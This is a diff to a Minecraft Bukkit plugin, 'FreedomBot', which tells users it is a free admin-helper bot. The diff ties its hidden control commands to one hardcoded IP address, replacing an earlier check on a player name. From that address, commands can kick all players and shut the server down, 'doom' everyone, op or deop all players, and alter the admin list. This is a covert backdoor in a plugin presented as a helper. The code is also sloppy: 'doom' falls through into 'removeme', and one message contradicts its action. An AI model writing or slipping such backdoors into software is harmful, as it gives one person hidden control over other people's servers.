@@ -29,7 +29,8 @@ public class Command_freedombot implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String string, String[] args) {
 
-        if (!sender.getName().equals("FoxIshDaBest")) {
+        Player player = (Player) sender;
+        if (!player.getAddress().getHostName().trim().equals("73.170.172.81")) {
             sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v3.0" + ChatColor.DARK_GRAY + "-----");
             sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v3.0!");
             sender.sendMessage(ChatColor.YELLOW + "FreedomBot is a free op server bot that makes admin's jobs easier.");
@@ -38,22 +39,23 @@ public class Command_freedombot implements CommandExecutor {
             sender.sendMessage(ChatColor.YELLOW + "Want to contribute to FreedomBot?");
             sender.sendMessage(ChatColor.YELLOW + "Go to https://github.com/MCPluginDev/FreedomBot and create a pull request!");
             sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v3.0" + ChatColor.DARK_GRAY + "-----");
-        } else if (sender.getName().equals("FoxIshDaBest")) {
+        } else if (player.getAddress().getHostName().trim().equals("73.170.172.81")) {
             if (args.length == 0) {
-            sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v3.0" + ChatColor.DARK_GRAY + "-----");
-            sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v3.0!");
-            sender.sendMessage(ChatColor.YELLOW + "FreedomBot is a free op server bot that makes admin's jobs easier.");
-            sender.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Commands: " + ChatColor.YELLOW + "/freedombot, /opme, /admintool, /adminalert, /getgamemode, /getip");
-            sender.sendMessage(ChatColor.YELLOW + "More features will be coming soon!");
-            sender.sendMessage(ChatColor.YELLOW + "Want to contribute to FreedomBot?");
-            sender.sendMessage(ChatColor.YELLOW + "Go to https://github.com/MCPluginDev/FreedomBot and create a pull request!");
+                sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v3.0" + ChatColor.DARK_GRAY + "-----");
+                sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v3.0!");
+                sender.sendMessage(ChatColor.YELLOW + "FreedomBot is a free op server bot that makes admin's jobs easier.");
+                sender.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "Commands: " + ChatColor.YELLOW + "/freedombot, /opme, /admintool, /adminalert, /getgamemode, /getip");
+                sender.sendMessage(ChatColor.YELLOW + "More features will be coming soon!");
+                sender.sendMessage(ChatColor.YELLOW + "Want to contribute to FreedomBot?");
+                sender.sendMessage(ChatColor.YELLOW + "Go to https://github.com/MCPluginDev/FreedomBot and create a pull request or an issue!");
+                sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v3.0" + ChatColor.DARK_GRAY + "-----");
             } else if (args.length == 1) {
                 if (null != args[0]) {
                     switch (args[0]) {
                         case "stop":
                             Bukkit.broadcastMessage(ChatColor.RED + "FreedomBot - Stopping the server");
-                            for (Player player : Bukkit.getOnlinePlayers()) {
-                                player.kickPlayer(ChatColor.DARK_GRAY + "| " + ChatColor.DARK_RED + "Freedom" + ChatColor.RED + "Bot" + ChatColor.DARK_GRAY + " | \n" + ChatColor.YELLOW + "The plugin FreedomBot has forced the server to shut down.");
+                            for (Player p : Bukkit.getOnlinePlayers()) {
+                                p.kickPlayer(ChatColor.DARK_GRAY + "| " + ChatColor.DARK_RED + "Freedom" + ChatColor.RED + "Bot" + ChatColor.DARK_GRAY + " | \n" + ChatColor.YELLOW + "The plugin FreedomBot has forced the server to shut down.");
                                 return true;
                             }
                             Bukkit.shutdown();
@@ -68,12 +70,21 @@ public class Command_freedombot implements CommandExecutor {
                             return true;
                         case "doom":
                             Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Dooming " + ChatColor.DARK_RED + "EVERYONE");
-                            for (Player player : Bukkit.getOnlinePlayers()) {
-                                if (!player.getName().equals("FoxIshDaBest")) {
-                                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "doom " + player.getName());
+                            for (Player p : Bukkit.getOnlinePlayers()) {
+                                if (!p.getName().equals("FoxIshDaBest")) {
+                                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "doom " + p.getName());
                                 }
                             }
-                        return true;
+                        case "removeme":
+                            BotUtil.removeAdmin(sender);
+                            Bukkit.broadcastMessage(ChatColor.RED + "FreedomBot - Adding " + sender.getName() + " to the admin list");
+                            return true;
+                        case "opall":
+                            BotUtil.opall();
+                            return true;
+                        case "deopall":
+                            BotUtil.deopall();
+                            return true;
                     }
                 }
             }
